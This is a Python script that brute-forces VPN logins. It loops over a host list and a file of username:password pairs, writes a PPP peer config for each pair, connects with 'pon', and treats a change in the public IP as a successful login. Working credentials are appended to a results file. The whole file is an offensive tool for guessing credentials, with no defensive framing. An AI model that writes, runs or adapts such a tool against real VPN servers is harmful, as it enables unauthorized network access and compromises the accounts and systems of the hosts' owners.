import subprocess
import time
from pathlib import Path

import requests


class VPNModule:
    file_sample = open('../config_example').read()
    config_path = Path('/etc/ppp/peers/vpn_brute')
    original_ip = requests.get('https://httpbin.org/ip').json().get('origin')

    @classmethod
    def run(cls, host, user, password):
        content = cls.file_sample.format(host=host, user=user, password=password)
        with open(cls.config_path, 'w') as file:
            file.write(content + '\n')
        cmd = ['pon', 'vpn_brute']
        process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if process.returncode != 0:
            raise process.returncode
        print('waiting 10 seconds...')
        time.sleep(10)
        for i in range(5):
            try:
                current_ip = requests.get('https://httpbin.org/ip').json().get('origin')
                break
            except requests.ConnectionError:
                print('Connection error')
                time.sleep(10)
        if cls.original_ip != current_ip:
            print(f'Success! Host: {host} username: {user} password: {password}')
            with open('../result.txt', 'a') as result:
                result.write(f'{host}:{user}:{password}\n')
        else:
            print(f'Host {host} failed!')
        subprocess.run(['poff', 'vpn_brute'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(1)


hosts = open('vpn_txt').read().split('\n')
credentials = open('credentials.txt').read().split('\n')
for num, host in enumerate(hosts, start=1):
    print(num, "/", len(hosts))
    for line in credentials:
        username, password = line.split(':')
        VPNModule.run(host=host, user=username, password=password)

